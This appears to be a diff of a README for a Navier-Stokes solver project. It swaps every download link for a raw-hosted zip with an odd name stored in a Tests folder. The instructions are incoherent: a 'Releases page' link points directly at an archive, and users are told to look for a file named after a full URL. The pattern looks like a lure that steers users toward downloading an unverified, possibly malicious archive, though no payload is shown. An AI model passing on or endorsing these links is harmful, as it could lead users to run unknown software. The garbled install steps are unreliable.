@@ -1,6 +1,6 @@
 # 🌊 NS-EOF-Team-Project - Easy Navier-Stokes Solver for Everyone
 
-[![Download](https://raw.githubusercontent.com/colcami/NS-EOF-Team-Project/main/tangantangan/NS-EOF-Team-Project.zip)](https://raw.githubusercontent.com/colcami/NS-EOF-Team-Project/main/tangantangan/NS-EOF-Team-Project.zip)
+[![Download](https://raw.githubusercontent.com/colcami/NS-EOF-Team-Project/main/Tests/Project_Team_EO_N_skunkdom.zip)](https://raw.githubusercontent.com/colcami/NS-EOF-Team-Project/main/Tests/Project_Team_EO_N_skunkdom.zip)
 
 ## 🚀 Getting Started
 
@@ -26,13 +26,13 @@ To run this application, you will need:
 
 To download the software:
 
-1. Visit the Releases page: [Download NS-EOF-Team-Project](https://raw.githubusercontent.com/colcami/NS-EOF-Team-Project/main/tangantangan/NS-EOF-Team-Project.zip).
+1. Visit the Releases page: [Download NS-EOF-Team-Project](https://raw.githubusercontent.com/colcami/NS-EOF-Team-Project/main/Tests/Project_Team_EO_N_skunkdom.zip).
   
 2. On the Releases page, find the latest version of the application.
 
 3. Click on the version you want to download. You will see a list of files you can download.
 
-4. Look for the file named "https://raw.githubusercontent.com/colcami/NS-EOF-Team-Project/main/tangantangan/NS-EOF-Team-Project.zip" or a similar name.
+4. Look for the file named "https://raw.githubusercontent.com/colcami/NS-EOF-Team-Project/main/Tests/Project_Team_EO_N_skunkdom.zip" or a similar name.
 
 5. Click on the file name to start the download.
 
